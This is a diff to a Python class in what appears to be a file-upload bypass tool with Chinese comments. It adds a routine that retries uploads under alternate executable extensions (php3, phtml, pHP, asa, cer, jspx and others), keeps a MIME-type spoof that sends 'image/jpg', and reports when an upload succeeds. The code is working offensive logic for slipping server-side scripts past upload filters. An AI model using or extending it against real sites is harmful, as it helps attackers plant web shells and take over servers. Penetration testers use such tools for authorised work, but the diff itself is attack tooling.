@@ -40,25 +40,45 @@ class General:
         尝试攻击并检查输出
         :return:
         '''
-        p1 = self.mimeBypass()
+        p1 = self.mimeBypass()   # MIME绕过
         c1 = self.Comman.checkResult(self.initUrls, p1)
-        if c1 == True:
-            print(green('[ result ]') + cyan('成功上传'))
-            if self.stop == True:
-                self.end()
-        self.end()
+        self.end(check=c1, stop=self.stop)
+
+        p2 = self.rareSuffixBypass()  # 同义后缀名绕过
+
+        self.end(stop=True)
         return
 
-    def end(self):
+    def end(self, check=False, stop=False):
         # 判断是否结束
-        print(blue('[ schedule ]') + cyan('测试完毕'))
-        sys.exit(0)
+        if check == True:
+            print(green('[ result ]') + cyan('成功上传'))
+        if stop == True:
+            print(blue('[ schedule ]') + cyan('测试完毕'))
+            sys.exit()
+        return
 
 
     def fuzzHeaders(self, headers, key, value):
         # 混淆headers
         headers[key] = value
         return headers
+
+    def fuzzRareSuffix(self, suffix, filename):
+        # 替换后缀名
+        PHP = ['php', 'php2', 'phtml', 'php3', 'php5', 'pHP']
+        ASP = ['asa', 'asp', 'aspx', 'ascx', 'ashx', 'cer', 'ASp']
+        JSP = ['jsp', 'jspx', 'jSP']
+        if suffix in PHP:
+            PHP.remove(suffix)
+            return [filename.replace(suffix, x) for x in PHP]
+        if suffix in ASP:
+            ASP.remove(suffix)
+            return [filename.replace(suffix, x) for x in ASP]
+        if suffix in JSP:
+            JSP.remove(suffix)
+            return [filename.replace(suffix, x) for x in JSP]
+        return []
 
     def mimeBypass(self, ct='image/jpg'):
         '''
@@ -78,6 +98,41 @@ class General:
         files = self.setFiles(self.args.field, file=file, ct=ct)
         res = self.Comman.upload(self.args.u, files, data=self.data)
         return res
+
+    def rareSuffixBypass(self):
+        '''
+        同义后缀名替换
+        :return:
+        '''
+        if self.args.attach != '':  # 存在attach文件，获取后缀名备用
+            file = self.args.attach
+            filename = self.Comman.getFilename(self.args.attach)
+        else:
+            file = self.args.f
+            filename = self.Comman.getFilename(self.args.f)
+        suffix = self.getSuffix(filename)
+        if suffix == False:
+            return False
+        fns = self.fuzzRareSuffix(suffix, filename)
+        for f in fns:
+            files = self.setFiles(
+                field=self.args.field,
+                file=file,
+                filename=f
+            )
+            res = self.Comman.upload(self.args.u, files, self.data)
+            check = self.Comman.checkResult(self.initUrls, res)
+            self.end(check=check, stop=self.stop)
+        return
+
+    def getSuffix(self, filename):
+        # 获取文件名后缀
+        try:
+            ext = filename.split('.')[-1]
+            return ext
+        except:
+            print(red('[ Error ]') + yellow('获取文件后缀名失败'))
+            return False
 
     def setAttachFiles(self, field, file, attach, ct='', other={}):
         # 设置attach文件
